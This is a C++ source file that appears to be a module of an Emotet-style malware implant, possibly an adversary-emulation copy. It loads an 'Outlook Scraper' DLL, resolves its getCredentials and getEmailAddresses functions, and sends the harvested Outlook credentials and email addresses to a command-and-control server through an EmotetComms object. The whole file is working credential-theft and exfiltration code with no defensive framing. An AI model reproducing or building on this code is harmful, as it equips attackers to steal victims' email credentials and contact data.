#include "pch.h"
#include "loadOutlookScraper.h"
//Global variables
getCredentialsPtr getCredentials = NULL;
getEmailAddressesPtr getEmailAddresses = NULL;

/*
 * loadOutlookScraper:
 *      About:
 *          Loads module from file, creates pointers to the exported functions
 *			from the DLL
 *      Result:
 *          If the function fails, returns failure to C2
 *
 */
bool loadOutlookScraper(EmotetComms *comms, string modulePath) {
	wstring modulePathW(modulePath.begin(), modulePath.end());
	
	// Load Outlook Scraper DLL
	HMODULE hOutlookScrapperDLL = LoadLibraryW(modulePathW.c_str());

	if (!hOutlookScrapperDLL) {
		printf("Could not load Outlook Scraper DLL\n");
		comms->sendOutput("Could not load Outlook Scraper DLL");
		return false;
	}

	getCredentials = (getCredentialsPtr)::GetProcAddress(hOutlookScrapperDLL, "getCredentials");
	if (!getCredentials) {
		printf("Could not load functionL\n");
		comms->sendOutput("Could not load function");
		return false;
	}

	getEmailAddresses = (getEmailAddressesPtr)::GetProcAddress(hOutlookScrapperDLL, "getEmailAddresses");
	if (!getEmailAddresses) {
		printf("Could not load functionL\n");
		comms->sendOutput("Could not load function");
		return false;
	}

	return comms->sendOutput("successfully loaded Outlook module");
}

bool getCredentialsOutlookScraper(EmotetComms* comms, bool stop, bool restart) {

	if (getCredentials == NULL) {
		comms->sendOutput("Need to load outlook module first");
		return false;
	}

	char* result_c = new char[BUFSIZE];
	if (getCredentials(result_c, BUFSIZE, stop, restart)) {
		string result = result_c;
		// Send credentials to C2
		return comms->sendOutput(result);
	}
	return comms->sendOutput("Unable to read credentials");
}

bool getEmailAddressesOutlookScraper(EmotetComms* comms, bool stop, bool restart) {

	if (getEmailAddresses == NULL) {
		comms->sendOutput("Need to load outlook module first");
		return false;
	}

	char* result_c = new char[BUFSIZE];
	if (getEmailAddresses(result_c, BUFSIZE, stop, restart)) {
		string result = result_c;
		// Send email addresses to C2
		return comms->sendOutput(result);
	}
	return comms->sendOutput("Unable to read email addresses");
}
